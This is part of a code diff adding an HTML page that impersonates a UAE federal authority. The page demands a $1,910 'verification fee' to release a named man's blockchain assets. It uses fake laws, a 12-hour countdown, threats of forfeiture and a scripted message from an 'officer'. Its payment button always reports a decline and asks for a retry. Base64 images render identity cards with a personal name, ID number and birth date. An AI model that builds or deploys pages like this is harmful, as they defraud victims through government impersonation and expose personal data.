+                <div class="timeline-marker"></div>
+                <div class="timeline-content">
+                  <h4>Asset Verification</h4>
+                  <p>Blockchain assets confirmed and valued</p>
+                  <div class="timeline-date">Sep 11, 2024 - 11:45 AM</div>
+                </div>
+              </div>
+
+              <div class="timeline-item active">
+                <div class="timeline-marker"></div>
+                <div class="timeline-content">
+                  <h4>Payment Required</h4>
+                  <p>Compliance fee payment initiated (DECLINED)</p>
+                  <div class="timeline-date">Today - 09:20 AM</div>
+                </div>
+              </div>
+
+              <div class="timeline-item">
+                <div class="timeline-marker"></div>
+                <div class="timeline-content">
+                  <h4>Asset Transfer</h4>
+                  <p>Immediate transfer to Binance wallet</p>
+                  <div class="timeline-date">Pending payment completion</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </aside>
+      </div>
+
+      <!-- Document Viewer Modal -->
+      <div class="document-viewer-overlay" id="documentViewer">
+        <div class="document-viewer">
+          <div class="viewer-header">
+            <h3>
+              <i class="fas fa-file-contract"></i>
+              <span id="viewerTitle">Document Viewer</span>
+            </h3>
+            <button class="close-viewer" id="closeViewer">
+              <i class="fas fa-times"></i>
+            </button>
+          </div>
+          <div class="viewer-body">
+            <img
+              id="documentImage"
+              class="document-image"
+              src=""
+              alt="Document Preview"
+            />
+          </div>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <footer class="footer">
+        <p>
+          © 2024 UAE Federal Authority for Identity & Citizenship, Customs &
+          Port Security. All rights reserved.
+        </p>
+        <p>
+          This verification portal is officially sanctioned under UAE Federal
+          Law No. 8 of 2017 concerning Virtual Assets Regulation.
+        </p>
+
+        <div class="disclaimer">
+          <p>
+            <strong>IMPORTANT NOTICE:</strong> This is the FINAL STEP to release
+            your blockchain assets. Failure to complete the $1,910 verification
+            fee payment within <strong>12 hours</strong> will result in:
+          </p>
+          <ul style="margin-top: 10px; padding-left: 20px">
+            <li>
+              Temporary suspension of your assets for 30 days pending further
+              review
+            </li>
+            <li>Administrative hold fee of $500 applied to your account</li>
+            <li>
+              Required in-person verification at UAE Federal Authority offices
+              in Dubai
+            </li>
+            <li>
+              Possible forfeiture of assets under UAE Federal Law Article 42 if
+              not claimed within 90 days
+            </li>
+          </ul>
+          <p style="margin-top: 15px">
+            The $1,910 fee is a one-time regulatory compliance charge mandated
+            by UAE Federal Authority and is non-refundable once the asset
+            transfer process has been initiated.
+          </p>
+        </div>
+      </footer>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // Countdown Timer
+        let countdownTime = 12 * 60 * 60; // 12 hours in seconds
+        const countdownDisplay = document.getElementById("countdown");
+
+        function updateCountdown() {
+          const hours = Math.floor(countdownTime / 3600);
+          const minutes = Math.floor((countdownTime % 3600) / 60);
+          const seconds = countdownTime % 60;
+
+          countdownDisplay.textContent = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+
+          if (countdownTime <= 0) {
+            clearInterval(countdownInterval);
+            countdownDisplay.textContent = "00:00:00";
+            document.querySelector(".urgent-alert h3").textContent =
+              "TIME EXPIRED: ASSETS PLACED ON HOLD";
+            document.querySelector(".urgent-alert p").innerHTML =
+              "<strong>Your verification window has expired.</strong> Your assets have been placed on a 30-day administrative hold. Contact UAE Federal Authority support immediately.";
+          } else {
+            countdownTime--;
+          }
+        }
+
+        const countdownInterval = setInterval(updateCountdown, 1000);
+        updateCountdown();
+
+        // Document Viewer
+        const documentCards = document.querySelectorAll(".document-card");
+        const documentViewer = document.getElementById("documentViewer");
+        const closeViewer = document.getElementById("closeViewer");
+        const viewerTitle = document.getElementById("viewerTitle");
+        const documentImage = document.getElementById("documentImage");
+
+        // Document images data (simulated)
+        const documentImages = {
+          "emirates-id":
+            "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDgwMCA1MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjgwMCIgaGVpZ2h0PSI1MDAiIGZpbGw9IiNmNWY3ZmEiLz48cmVjdCB4PSI1MCIgeT0iNTAiIHdpZHRoPSI3MDAiIGhlaWdodD0iNDAwIiBmaWxsPSJ3aGl0ZSIgcng9IjEwIi8+PHJlY3QgeD0iNzAiIHk9IjgwIiB3aWR0aD0iMTUwIiBoZWlnaHQ9IjIwMCIgZmlsbD0iIzBjNGI3OCIgcng9IjUiLz48dGV4dCB4PSI4MCIgeT0iMTEwIiBmaWxsPSJ3aGl0ZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE0Ij5VQUUgRW1pcmF0ZXM8L3RleHQ+PHRleHQgeD0iODAiIHk9IjEzMCIgZmlsbD0id2hpdGUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCI+UmVzaWRlbnQgSUQ8L3RleHQ+PHRleHQgeD0iMjQwIiB5PSIxMTAiIGZpbGw9IiMwYzRiNzgiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiPkpvd2VsIENob3dkIDwvdGV4dD48dGV4dCB4PSIyNDAiIHk9IjE0MCIgZmlsbD0iIzBjNGI3OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmb250LXdlaWdodD0iYm9sZCI+dnN0IFZodXAgYWw8L3RleHQ+PHRleHQgeD0iMjQwIiB5PSIyMDAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiI+SUQgTnVtYmVyOiA3ODQtMTk4MC04NjM3NDY4LTc8L3RleHQ+PHRleHQgeD0iMjQwIiB5PSIyMzAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiI+TmF0aW9uYWxpdHk6IEJhbmdsYWRlc2g8L3RleHQ+PHRleHQgeD0iMjQwIiB5PSIyNjAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiI+RG9iOiAyMy8wOC8xOTgwPC90ZXh0Pjx0ZXh0IHg9IjI0MCIgeT0iMjkwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiPkV4cGlyeSBEYXRlOiAwOC8wOS8yMDI2PC90ZXh0Pjx0ZXh0IHg9IjU1MCIgeT0iMzgwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiPkZlZGVyYWwgQXV0aG9yaXR5IGZvciBJZGVudGl0eSAmIENpdGl6ZW5zaGlwPC90ZXh0Pjx0ZXh0IHg9IjU1MCIgeT0iNDAwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiPlVuaXRlZCBBcmFiIEVtaXJhdGVzPC90ZXh0Pjwvc3ZnPg==",
+          "driving-license":
+            "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDgwMCA1MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjgwMCIgaGVpZ2h0PSI1MDAiIGZpbGw9IiNmNWY3ZmEiLz48cmVjdCB4PSI1MCIgeT0iNTAiIHdpZHRoPSI3MDAiIGhlaWdodD0iNDAwIiBmaWxsPSJ3aGl0ZSIgcng9IjEwIi8+PHJlY3QgeD0iNzAiIHk9IjgwIiB3aWR0aD0iNjYwIiBoZWlnaHQ9IjYwIiBmaWxsPSIjMGM0Yjc4IiByeD0iNSIvPjx0ZXh0IHg9IjEwMCIgeT0iMTIwIiBmaWxsPSJ3aGl0ZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmb250LXdlaWdodD0iYm9sZCI+VW5pdGVkIEFyYWIgRW1pcmF0ZXMgLSBEcml2aW5nIExpY2Vuc2U8L3RleHQ+PHJlY3QgeD0iNzAiIHk9IjE2MCIgd2lkdGg9IjIwMCIgaGVpZ2h0PSIxMjAiIGZpbGw9IiNmMGY0ZjgiIHJ4PSI1Ii8+PHRleHQgeD0iOTAiIHk9IjE5MCIgZmlsbD0iIzBjNGI3OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE2IiBmb250LXdlaWdodD0iYm9sZCI+TGljZW5zZSBOPC90ZXh0Pjx0ZXh0IHg9IjkwIiB5PSIyMjAiIGZpbGw9IiMwYzRiNzgiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIzMiIgZm9udC13ZWlnaHQ9ImJvbGQiPjEwNTc1Mzc8L3RleHQ+PHRleHQgeD0iMzAwIiB5PSIxOTAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxOCI+TmFtZTwvdGV4dD48dGV4dCB4PSIzMDAiIHk9IjIyMCIgZmlsbD0iIzBjNGI3OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjIyIiBmb250LXdlaWdodD0iYm9sZCI+Sm93ZWwgQ2hvd2RidXJ5PC90ZXh0Pjx0ZXh0IHg9IjMwMCIgeT0iMjUwIiBmaWxsPSIjMGM0Yjc4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMjIiIGZvbnQtd2VpZ2h0PSJib2xkIj5WaHVwYWwgQ2hvd2RodXJ5PC90ZXh0Pjx0ZXh0IHg9IjMwMCIgeT0iMzAwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiPk5hdGlvbmFsaXR5OiBCYW5nbGFkZXNoPC90ZXh0Pjx0ZXh0IHg9IjMwMCIgeT0iMzMwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiPkRvYjogMjMvMDgvMTk4MDwvdGV4dD48dGV4dCB4PSI1NTAiIHk9IjMwMCIgZmlsbD0iIzZjNzU3ZCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE2Ij5Jc3N1ZSBEYXRlOiAyNi8wMy8yMDI2PC90ZXh0Pjx0ZXh0IHg9IjU1MCIgeT0iMzMwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiPkV4cGlyeSBEYXRlOiAyNi8wMy8yMDI2PC90ZXh0Pjx0ZXh0IHg9IjU1MCIgeT0iMzYwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2lplPSIxNiI+UGxhY2Ugb2YgSXNzdWU6IER1YmFpPC90ZXh0Pjx0ZXh0IHg9Ijc1IiB5PSI0MjAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCI+RGF0YWJhc2UgUmVmOiBSVEExMTg1OTwvdGV4dD48L3N2Zz4=",
+          "employment-card":
+            "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDgwMCA1MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjgwMCIgaGVpZ2h0PSI1MDAiIGZpbGw9IiNmNWY3ZmEiLz48cmVjdCB4PSI1MCIgeT0iNTAiIHdpZHRoPSI3MDAiIGhlaWdodD0iNDAwIiBmaWxsPSJ3aGl0ZSIgcng9IjEwIi8+PHJlY3QgeD0iNzAiIHk9IjgwIiB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgZmlsbD0iIzBjNGI3OCIgcng9IjUiLz48dGV4dCB4PSI5MCIgeT0iMTEwIiBmaWxsPSJ3aGl0ZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE0Ij5FbXBsb3llZTwvdGV4dD48dGV4dCB4PSI5MCIgeT0iMTMwIiBmaWxsPSJ3aGl0ZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE0Ij5JRCBDYXJkPC90ZXh0Pjx0ZXh0IHg9IjI5MCIgeT0iMTAwIiBmaWxsPSIjMGM0Yjc4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMjQiIGZvbnQtd2VpZ2h0PSJib2xkIj5PYXNpcyBQdXJlIFdhdGVyPC90ZXh0Pjx0ZXh0IHg9IjI5MCIgeT0iMTMwIiBmaWxsPSIjMGM0Yjc4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2lplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiPkZhY3RvcnkgKEwuTC5DLik8L3RleHQ+PHJlY3QgeD0iNzAiIHk9IjI1MCIgd2lkdGg9IjY2MCIgaGVpZ2h0PSIxMDAiIGZpbGw9IiNmMGY0ZjgiIHJ4PSI1Ii8+PHRleHQgeD0iOTAiIHk9IjI4MCIgZmlsbD0iIzBjNGI3OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4Ij5DYXJkIE51bWJlcjwvdGV4dD48dGV4dCB4PSIyNTIiIHk9IjI4MCIgZmlsbD0iIzBjNGI3OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmb250LXdlaWdodD0iYm9sZCI+MTM5MjQzMTIxPC90ZXh0Pjx0ZXh0IHg9IjkwIiB5PSIzMjAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxOCI+TmFtZTwvdGV4dD48dGV4dCB4PSIyNTIiIHk9IjMyMCIgZmlsbD0iIzBjNGI3OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjIwIj5Kb3dlbCBDaG93ZGh1cnkgVmh1cGFsPC90ZXh0Pjx0ZXh0IHg9IjU1MCIgeT0iMjgwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiPk9jY3VwYXRpb248L3RleHQ+PHRleHQgeD0iNTUwIiB5PSIzMDAiIGZpbGw9IiMwYzRiNzgiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiIgZm9udC13ZWlnaHQ9ImJvbGQiPlNhbGVzIE9mZmljZXI8L3RleHQ+PHRleHQgeD0iNTUwIiB5PSIzMjAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiI+SVNTVUlORyBQTEFDRTwvdGV4dD48dGV4dCB4PSI1NTAiIHk9IjM0MCIgZmlsbD0iIzBjNGI3OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE2IiBmb250LXdlaWdodD0iYm9sZCI+RHViYWksIFVBRTwvdGV4dD48dGV4dCB4PSI3NSIgeT0iNDIwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiPklmIHlvdSBmaW5kIHRoaXMgY2FyZCwgcGxlYXNlIHJldHVybiBpdCB0byB0aGUgaXNzdWluZyBvcmdhbml6YXRpb24gb3IgdG8gdGhlIG5lYXJlc3QgcG9saWNlIHN0YXRpb24uPC90ZXh0Pjwvc3ZnPg==",
+          "traffic-code":
+            "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjUwMCIgdmlld0JveD0iMCAwIDgwMCA1MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjgwMCIgaGVpZ2h0PSI1MDAiIGZpbGw9IiNmNWY3ZmEiLz48cmVjdCB4PSI1MCIgeT0iNTAiIHdpZHRoPSI3MDAiIGhlaWdodD0iNDAwIiBmaWxsPSJ3aGl0ZSIgcng9IjEwIi8+PHJlY3QgeD0iNzAiIHk9IjcwIiB3aWR0aD0iNjYwIiBoZWlnaHQ9IjYwIiBmaWxsPSIjMGM0Yjc4IiByeD0iNSIvPjx0ZXh0IHg9IjEwMCIgeT0iMTEwIiBmaWxsPSJ3aGl0ZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmb250LXdlaWdodD0iYm9sZCI+VHJhZmZpYyBDb2RlIE5vLiAxMTI1NDI4OTwvdGV4dD48dGV4dCB4PSIxMDAiIHk9IjE1MCIgZmlsbD0iIzZjNzU3ZCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4Ij5QZXJtaXR0ZWQgVmVoaWNsZXMgLSAgICAgICBMaWdodCBWZWhpY2xlPC90ZXh0PjxyZWN0IHg9IjcwIiB5PSIxODAiIHdpZHRoPSI2NjAiIGhlaWdodD0iMTYwIiBmaWxsPSIjZjBmNGY4IiByeD0iNSIvPjx0ZXh0IHg9IjkwIiB5PSIyMTAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiI+VGhpcyBsaWNlbnNlIHNob3VsZCBiZSB3aXRoIHlvdSB3aGVuIHlvdSBhcmUgZHJpdmluZyBhbmQgc2hvdWxkIGJlPC90ZXh0Pjx0ZXh0IHg9IjkwIiB5PSIzMzAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiI+cHJlc2VudGVkIG9uIGRlbWFuZCB0byBhbiBhdXRob3JpemVkIHBlcnNvbi4gR2l2ZSB3YXkgdG8gYW1idWxhbmNlLCBjaXZpbDwvdGV4dD48dGV4dCB4PSI5MCIgeT0iMjUwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiPmRlZmVuY2UsIFZJUCBlc2NvcnQgYW5kIHBvbGljZSB2ZWhpY2xlcy48L3RleHQ+PHRleHQgeD0iMTAwIiB5PSIzMjAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiI+WXVqaWIgYW1sIHJ1a2hzeWEgYXlhbWFsIGNpcWFkYSB3YSBhbC1icnpoYXl1LmEgdWxpLXRhbGx1YiBsaWwtamFoYXp1PC90ZXh0Pjx0ZXh0IHg9IjEwMCIgeT0iMzQwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiPmFsLW11a2h0YXNzYS4gWXVqaWIgYWlzc20gYWwtdGFyZWVrIGxpLXNpeWFyYXQgaWwtSXNhYWYsIGFsLWRlZmFhPC90ZXh0Pjx0ZXh0IHg9IjEwMCIgeT0iMzYwIiBmaWxsPSIjNmM3NTdkIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTYiPmFsLW1hZG5pLCBhbC1tdWFraWIgYWwtcmFzbWl5YSB3YS1zaGVydGEuPC90ZXh0Pjx0ZXh0IHg9Ijc1IiB5PSI0MjAiIGZpbGw9IiM2Yzc1N2QiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCI+VW5pdGVkIEFyYWIgRW1pcmF0ZXMgfCBNaW5pc3RyeSBvZiBJbnRlcmlvciB8IFRyYWZmaWMgJiBQYXRyb2wgRGVwdC48L3RleHQ+PC9zdmc+",
+        };
+
+        const documentTitles = {
+          "emirates-id": "UAE Resident Identity Card",
+          "driving-license": "UAE Driving License",
+          "employment-card": "Employment ID Card",
+          "traffic-code": "Traffic Code Registration",
+        };
+
+        documentCards.forEach((card) => {
+          card.addEventListener("click", function () {
+            const docId = this.getAttribute("data-doc");
+            viewerTitle.textContent = documentTitles[docId];
+            documentImage.src = documentImages[docId];
+            documentViewer.style.display = "flex";
+
+            // Remove active class from all cards
+            documentCards.forEach((c) => c.classList.remove("active"));
+            // Add active class to clicked card
+            this.classList.add("active");
+          });
+        });
+
+        closeViewer.addEventListener("click", function () {
+          documentViewer.style.display = "none";
+        });
+
+        documentViewer.addEventListener("click", function (e) {
+          if (e.target === this) {
+            this.style.display = "none";
+          }
+        });
+
+        // Payment Button
+        const paymentButton = document.getElementById("paymentButton");
+
+        paymentButton.addEventListener("click", function () {
+          // Show processing state
+          paymentButton.innerHTML =
+            '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING PAYMENT...</span>';
+          paymentButton.disabled = true;
+
+          // Simulate payment processing with decline
+          setTimeout(() => {
+            // Show decline message
+            paymentButton.innerHTML =
+              '<i class="fas fa-times-circle"></i> <span>PAYMENT DECLINED - TRY AGAIN</span>';
+            paymentButton.disabled = false;
+
+            // Show decline alert
+            const declineAlert = document.createElement("div");
+            declineAlert.className = "declined-alert";
+            declineAlert.innerHTML = `
+                        <i class="fas fa-exclamation-circle"></i>
+                        <div>
+                            <h4>PAYMENT DECLINED AGAIN</h4>
+                            <p>Your payment was declined again. This could be due to insufficient funds, daily transaction limit, or your bank blocking the transaction. Please:</p>
+                            <ul class="declined-reasons">
+                                <li>Contact your bank to authorize international payments</li>
+                                <li>Ensure you have sufficient funds ($1,910 + any international fees)</li>
+                                <li>Try with a different payment method if available</li>
+                                <li>Complete payment within the next 11 hours to avoid asset suspension</li>
+                            </ul>
+                        </div>
+                    `;
+
+            document
+              .querySelector(".payment-body")
+              .insertBefore(
+                declineAlert,
+                document.querySelector(".payment-button-container"),
+              );
+
+            // Scroll to alert
+            declineAlert.scrollIntoView({
+              behavior: "smooth",
+              block: "center",
+            });
+
+            // Reset button after 5 seconds
+            setTimeout(() => {
+              paymentButton.innerHTML =
+                '<i class="fas fa-lock"></i> <span>RETRY SECURE PAYMENT - $1,910</span> <i class="fas fa-arrow-right"></i>';
+            }, 5000);
+          }, 3000);
+        });
+
+        // Simulate urgent notification
+        setTimeout(() => {
+          const notification = document.createElement("div");
+          notification.className = "urgent-alert";
+          notification.style.marginTop = "20px";
+          notification.style.animation = "none";
+          notification.innerHTML = `
+                    <i class="fas fa-envelope fa-2x"></i>
+                    <div>
+                        <h4>NEW MESSAGE FROM VERIFICATION OFFICER</h4>
+                        <p><strong>Officer Ahmed Al Mansoori:</strong> "Mr. Chowdhury, I see your payment was declined. Please complete the payment as soon as possible to avoid asset suspension. Contact your bank if needed. Your case reference is UAE-CRYPTO-2024-784-8637."</p>
+                    </div>
+                `;
+
+          document
+            .querySelector(".panel-body")
+            .insertBefore(
+              notification,
+              document.querySelector(".payment-section"),
+            );
+
+          // Auto-remove after 10 seconds
+          setTimeout(() => {
+            notification.style.opacity = "0";
+            notification.style.transition = "opacity 0.5s ease";
+            setTimeout(() => {
+              if (notification.parentNode) {
+                notification.parentNode.removeChild(notification);
+              }
+            }, 500);
+          }, 10000);
+        }, 10000);
+      });
+    </script>
+  </body>
+</html>
